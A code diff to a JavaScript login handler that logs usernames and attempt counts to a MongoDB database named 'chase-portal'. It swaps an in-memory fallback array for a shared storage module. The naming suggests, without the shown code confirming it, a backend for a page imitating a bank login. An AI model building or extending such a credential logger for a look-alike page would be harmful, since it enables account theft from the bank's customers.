@@ -1,4 +1,5 @@
 import mongoose from 'mongoose';
+import { sharedStorage } from './shared-storage.js';
 
 const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';
 
@@ -17,9 +18,6 @@ const LoginLog = mongoose.model('LoginLog', loginLogSchema);
 
 let dbConnected = false;
 let connection = null;
-
-// In-memory fallback storage for when MongoDB is unavailable
-const fallbackLogs = [];
 
 async function connectDB() {
   if (connection) return connection;
@@ -80,11 +78,11 @@ export default async function handler(req, res) {
           console.error('Error saving to MongoDB:', err.message);
           dbConnected = false;
           // Store in fallback
-          fallbackLogs.push(logData);
+          sharedStorage.addLog(logData);
         }
       } else {
         // Store in fallback array
-        fallbackLogs.push(logData);
+        sharedStorage.addLog(logData);
       }
       
       console.log(`[${new Date().toISOString()}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status}) [${stored}]`);
@@ -100,5 +98,3 @@ export default async function handler(req, res) {
     res.status(500).json({ success: false, error: error.message });
   }
 }
-
-export { fallbackLogs };
